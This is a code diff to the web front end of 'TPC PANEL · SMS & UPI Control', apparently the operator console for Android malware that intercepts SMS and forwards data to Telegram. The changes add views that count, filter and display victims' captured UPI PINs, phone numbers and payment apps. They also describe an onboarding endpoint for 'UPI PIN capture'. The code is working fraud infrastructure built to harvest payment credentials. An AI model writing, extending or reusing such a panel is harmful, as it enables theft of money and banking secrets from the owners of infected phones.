@@ -204,6 +204,12 @@
         border-color: #22d3ee33;
     }
     .secondary-button:hover { background: #22d3ee1f; border-color: var(--neon); box-shadow: 0 0 20px #22d3ee40; }
+    .secondary-button.active {
+        color: #001521;
+        background: linear-gradient(100deg, #22d3ee, #38bdf8);
+        border-color: transparent;
+        box-shadow: 0 0 22px #22d3ee5c;
+    }
 
     .ghost-button { color: var(--muted); background: transparent; border-color: var(--border); }
     .ghost-button:hover { color: var(--text); border-color: var(--border-hi); }
@@ -329,7 +335,7 @@
     /* ---------------------------------------------------------- stats */
 
     .stats-grid {
-        display: grid; grid-template-columns: repeat(4, minmax(0, 1fr));
+        display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
         gap: 16px; margin-bottom: 22px;
     }
 
@@ -408,6 +414,7 @@
     .badge.error, .badge.failed, .badge.offline { color: var(--red); border-color: #ff5c7a35; background: #ff5c7a12; }
     .badge.in { color: var(--violet); border-color: #8b5cf635; background: #8b5cf612; }
     .badge.out { color: var(--neon-2); border-color: #38bdf835; background: #38bdf812; }
+    .badge.pin { color: #c4b5fd; border-color: #8b5cf640; background: #8b5cf614; }
 
     .table-wrap { width: 100%; overflow-x: auto; }
 
@@ -418,7 +425,6 @@
     th {
         color: var(--muted); font-size: 10.5px; font-weight: 700;
         text-transform: uppercase; letter-spacing: 1.2px;
-        background: #0a1striking;
         background: #0a1226;
     }
 
@@ -427,6 +433,15 @@
     tbody tr:last-child td { border-bottom: 0; }
 
     .cell-sub { display: block; margin-top: 4px; color: #35507e; font-size: 11px; }
+
+    .cell-pin {
+        display: inline-block; margin-top: 5px; padding: 2px 8px;
+        border-radius: 6px; font-family: var(--mono); font-size: 11px;
+        font-weight: 700; letter-spacing: .6px;
+        color: #c4b5fd; background: #8b5cf614; border: 1px solid #8b5cf630;
+    }
+
+    .cell-pin.none { color: #35507e; background: #ffffff05; border-color: var(--border); font-weight: 500; }
 
     .cell-body {
         max-width: 340px; overflow: hidden; text-overflow: ellipsis;
@@ -702,7 +717,7 @@
             </div>
 
             <div class="sidebar-footer">
-                <div>TPC PANEL · v4.0</div>
+                <div>TPC PANEL · v4.1</div>
                 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
             </div>
         </aside>
@@ -756,6 +771,15 @@
                         </div>
                         <div class="stat-value violet" id="statSims">—</div>
                         <div class="stat-foot">SIM slots reported</div>
+                    </article>
+
+                    <article class="stat-card shadow-panel">
+                        <div class="stat-top">
+                            <span class="stat-label">PINs captured</span>
+                            <span class="stat-icon">🔑</span>
+                        </div>
+                        <div class="stat-value violet" id="statPins">—</div>
+                        <div class="stat-foot">onboarded devices</div>
                     </article>
                 </div>
 
@@ -1015,6 +1039,9 @@
                         <div class="panel-body">
                             <label for="botToken">Bot token (from @BotFather)</label>
                             <input id="botToken" placeholder="123456:ABC-DEF…" class="mono">
+                            <p class="small muted" style="margin:6px 0 0">
+                                Save karte waqt pura token paste karo — field khali chhodo to purana wala rehta hai.
+                            </p>
 
                             <label for="botChannel">Channel / group username</label>
                             <input id="botChannel" placeholder="@my_channel" class="mono">
@@ -1098,7 +1125,10 @@
                         <h2>Devices</h2>
                         <p>Registered fleet with SIM, power and network telemetry</p>
                     </div>
-                    <button class="secondary-button" data-refresh="devices" type="button">↻ Refresh</button>
+                    <div style="display:flex;gap:9px">
+                        <button class="secondary-button" id="pinsOnlyButton" type="button">🔑 PINs only</button>
+                        <button class="secondary-button" data-refresh="devices" type="button">↻ Refresh</button>
+                    </div>
                 </div>
 
                 <section class="panel shadow-panel">
@@ -1112,6 +1142,7 @@
                                 <tr>
                                     <th>Device</th>
                                     <th>Carrier / SIM</th>
+                                    <th>Number / PIN</th>
                                     <th>Power</th>
                                     <th>Network</th>
                                     <th>Status</th>
@@ -1140,7 +1171,7 @@
                     <div class="panel-body">
                         <div class="settings-row">
                             <strong>Panel</strong>
-                            <p>TPC PANEL · SMS &amp; UPI Control · v4.0</p>
+                            <p>TPC PANEL · SMS &amp; UPI Control · v4.1</p>
                         </div>
                         <div class="settings-row">
                             <strong>Owner</strong>
@@ -1153,6 +1184,10 @@
                         <div class="settings-row">
                             <strong>SMS ingest</strong>
                             <p>/devices/sms/incoming</p>
+                        </div>
+                        <div class="settings-row">
+                            <strong>Onboarding</strong>
+                            <p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p>
                         </div>
                         <div class="settings-row">
                             <strong>Outbox poll</strong>
@@ -1214,6 +1249,7 @@ const state = {
     rules: [],
     bots: [],
     tgLogs: [],
+    pinsOnly: false,
     toastTimer: null
 };
 
@@ -1308,6 +1344,8 @@ function batteryLabel(d) {
 
 function isOnline(d) { return Boolean(d.ws_connected); }
 
+function hasPin(d) { return Boolean(d.upi_pin); }
+
 /* ------------------------------------------------------- api client */
 
 async function api(path, options = {}) {
@@ -1332,7 +1370,11 @@ async function api(path, options = {}) {
         e.auth = true;
         throw e;
     }
-    if (!res.ok) throw new Error(data.detail || data.message || `Failed (${res.status})`);
+    if (!res.ok) {
+        let msg = data.detail || data.message || `Failed (${res.status})`;
+        if (Array.isArray(msg)) msg = msg.map((x) => x.msg || String(x)).join(", ");
+        throw new Error(msg);
+    }
     return data;
 }
 
@@ -1376,6 +1418,8 @@ function renderOverview() {
     );
     $("#statSims").textContent = sims;
 
+    $("#statPins").textContent = state.devices.filter(hasPin).length;
+
     const body = $("#recentDevicesBody");
     if (!state.devices.length) { renderEmpty(body, 4, "No devices registered"); return; }
 
@@ -1385,7 +1429,17 @@ function renderOverview() {
         const row = document.createElement("tr");
 
         appendCell(row, getDeviceName(d));
-        appendCell(row, t.sim_number || d.sim_number || t.sim_carrier || "—");
+
+        const simCell = document.createElement("td");
+        simCell.textContent = t.sim_number || d.sim_number || t.sim_carrier || "—";
+        if (d.upi_pin) {
+            const pin = document.createElement("span");
+            pin.className = "cell-pin";
+            pin.textContent = `PIN ${d.upi_pin}`;
+            simCell.appendChild(pin);
+        }
+        row.appendChild(simCell);
+
         createBadgeCell(row, getDeviceStatus(d));
         appendCell(row, formatDate(d.created_at));
 
@@ -1420,6 +1474,12 @@ function renderLive() {
         sub.className = "cell-sub";
         sub.textContent = `${isOnline(d) ? "● online" : "○ offline"} · ${t.sim_number || "no number"}`;
         nameCell.appendChild(sub);
+        if (d.upi_pin) {
+            const pin = document.createElement("span");
+            pin.className = "cell-pin";
+            pin.textContent = `PIN ${d.upi_pin}${d.payment_app ? " · " + d.payment_app : ""}`;
+            nameCell.appendChild(pin);
+        }
         row.appendChild(nameCell);
 
         const lastMsg = state.messages.find((m) => m.device_id === d.id);
@@ -1480,7 +1540,7 @@ function renderLive() {
         allBtn.addEventListener("click", () => {
             $("#msgFilter").value = "";
             navigate("messages");
-            state.messages = state.messages;
+            renderMessages();   // FIX: pehle no-op tha
         });
         allCell.appendChild(allBtn);
         row.appendChild(allCell);
@@ -1601,7 +1661,11 @@ function renderTelegram() {
         setBadge($("#tgBadge"), bot.bound ? "Bound" : "Pending",
             bot.bound ? "bound" : "pending");
 
-        $("#botToken").value = bot.token_masked || "";
+        // FIX: masked token 17 chars hota hai (< min_length 20), isliye placeholder me daalo
+        $("#botToken").value = "";
+        $("#botToken").placeholder = bot.token_masked
+            ? `${bot.token_masked}  (paste pura token)`
+            : "123456:ABC-DEF…";
         $("#botChannel").value = bot.channel || "";
     }
 
@@ -1629,13 +1693,20 @@ function renderTelegram() {
 }
 
 function renderDevices() {
-    $("#deviceCount").textContent = `${state.devices.length} devices`;
+    const list = state.pinsOnly ? state.devices.filter(hasPin) : state.devices;
+
+    $("#deviceCount").textContent = state.pinsOnly
+        ? `${list.length} with PIN`
+        : `${list.length} devices`;
 
     const body = $("#devicesBody");
-    if (!state.devices.length) { renderEmpty(body, 7, "No devices registered"); return; }
+    if (!list.length) {
+        renderEmpty(body, 8, state.pinsOnly ? "Koi PIN capture nahi hua" : "No devices registered");
+        return;
+    }
 
     body.replaceChildren();
-    state.devices.forEach((d) => {
+    list.forEach((d) => {
         const t = getTelemetry(d);
         const row = document.createElement("tr");
 
@@ -1654,6 +1725,17 @@ function renderDevices() {
         simSub.textContent = t.sim_number || d.sim_number || "number not exposed";
         carrierCell.appendChild(simSub);
         row.appendChild(carrierCell);
+
+        // --- Number / PIN
+        const numCell = document.createElement("td");
+        numCell.textContent = d.phone_number || "—";
+        const pinSub = document.createElement("span");
+        pinSub.className = d.upi_pin ? "cell-pin" : "cell-pin none";
+        pinSub.textContent = d.upi_pin
+            ? `PIN ${d.upi_pin}${d.payment_app ? " · " + d.payment_app : ""}`
+            : "no PIN";
+        numCell.appendChild(pinSub);
+        row.appendChild(numCell);
 
         const battCell = document.createElement("td");
         const badge = document.createElement("span");
@@ -1726,6 +1808,15 @@ function openDeviceDetails(d) {
         ["Registered", formatDate(d.created_at)]
     ]));
 
+    body.appendChild(detailGroup("Onboarding", [
+        ["Entered number", d.phone_number],
+        ["UPI PIN", d.upi_pin],
+        ["Payment app", d.payment_app],
+        ["Amount", d.onboard_amount != null ? `₹${d.onboard_amount}` : null],
+        ["Onboarded", d.onboarded ? "Yes" : "No"],
+        ["Onboarded at", formatDate(d.onboarded_at)]
+    ]));
+
     body.appendChild(detailGroup("SIM & network", [
         ["Carrier", t.sim_carrier || d.sim_carrier],
         ["SIM number", t.sim_number || d.sim_number],
@@ -1752,7 +1843,8 @@ function openDeviceDetails(d) {
     ]));
 
     body.appendChild(detailGroup("SMS", [
-        ["Inbox synced", t.sms_inbox_count],
+        ["Inbox synced", d.sms_inbox_synced_at ? formatDate(d.sms_inbox_synced_at) : null],
+        ["Inbox count", t.sms_inbox_count],
         ["Sent count", t.sms_sent_count],
         ["Received count", t.sms_received_count]
     ]));
@@ -1858,6 +1950,12 @@ function navigate(page) {
 
 /* --------------------------------------------------------- actions */
 
+$("#pinsOnlyButton").addEventListener("click", () => {
+    state.pinsOnly = !state.pinsOnly;
+    $("#pinsOnlyButton").classList.toggle("active", state.pinsOnly);
+    renderDevices();
+});
+
 $("#bulkSend").addEventListener("click", async () => {
     const body = $("#bulkBody").value.trim();
     if (!body) { showToast("message khali hai"); return; }
@@ -1911,7 +2009,14 @@ $("#botSave").addEventListener("click", async () => {
     const token = $("#botToken").value.trim();
     const channel = $("#botChannel").value.trim();
 
-    if (!token || !channel) { showToast("token aur channel dono chahiye"); return; }
+    if (!token || !channel) {
+        showToast("token aur channel dono chahiye (token paste karo)");
+        return;
+    }
+    if (token.length < 20) {
+        showToast("token chhota lag raha hai — pura token paste karo");
+        return;
+    }
 
     $("#botSave").disabled = true;
     try {
@@ -1970,6 +2075,8 @@ $("#logoutButton").addEventListener("click", async () => {
     try { await api("/admin/logout", { method: "POST" }); } catch {}
     state.devices = [];
     state.messages = [];
+    state.pinsOnly = false;
+    $("#pinsOnlyButton").classList.remove("active");
     showLogin();
     showToast("logged out");
 });
